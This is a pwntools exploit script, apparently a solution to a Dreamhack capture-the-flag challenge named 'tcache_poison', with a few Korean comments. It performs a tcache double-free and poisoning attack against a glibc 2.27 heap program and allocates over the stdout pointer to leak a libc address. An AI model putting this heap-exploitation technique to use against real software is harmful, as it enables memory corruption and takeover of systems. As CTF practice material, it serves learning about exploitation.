from pwn import *

p = remote('host3.dreamhack.games', 19525)
# p = process('./tcache_poison')
libc = ELF('libc-2.27.so')
e = ELF('./tcache_poison')
context.log_level = 'debug'

def slog (sym, addr):
    return success(sym + ' : ' + hex(addr))
def alloc(size, chunk):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', chunk)
def free():
    p.sendlineafter(b'Edit\n', b'2')  
def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')
def edit(data):    
    p.sendlineafter(b'Edit\n', b'4')
    p.sendlineafter(b'chunk: ', data)

alloc(0x30, b'aaaa') # 현재 chunk의 데이터 부분에 61616161 쓰여있음.
free() # next에 0x0228c010이 있는 것을 보아 tcache에 들어감.
edit(b'B' * 8 + b'\x00') # next의 끝이 널로 변환되었음
free() 

addr_stdout = e.symbols['stdout']
slog('address of stdout', addr_stdout)
alloc(0x30, p64(addr_stdout))
alloc(0x30, b'BBBBBBBB')
print("allocate 'BBBBBBBB'")
print_chunk()  
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb)
print("allocate libc.symbols['_IO_2_1_stdout_']")
print_chunk()